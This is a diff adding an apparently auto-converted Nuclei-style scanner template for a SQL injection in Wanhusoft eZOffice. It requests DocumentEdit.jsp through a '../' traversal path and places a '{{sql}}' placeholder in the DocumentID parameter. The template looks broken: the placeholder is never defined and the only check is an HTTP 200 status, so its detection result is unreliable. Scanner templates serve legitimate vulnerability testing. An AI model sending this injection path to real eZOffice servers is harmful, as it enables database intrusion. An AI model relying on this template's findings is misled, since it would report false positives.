@@ -1,0 +1,18 @@
+id: yaml-poc-wanhusoft-ezoffice-sql_injection-CT-479129
+info:
+  name: Yaml Poc Wanhusoft Ezoffice Sql_Injection Ct 479129
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-wanhusoft-ezoffice-sql_injection-CT-479129'
+  tags: sqli
+  reference:
+  - http://124.223.89.192/archives/ezoffice02
+http:
+- method: GET
+  path:
+  - /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID={{sql}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
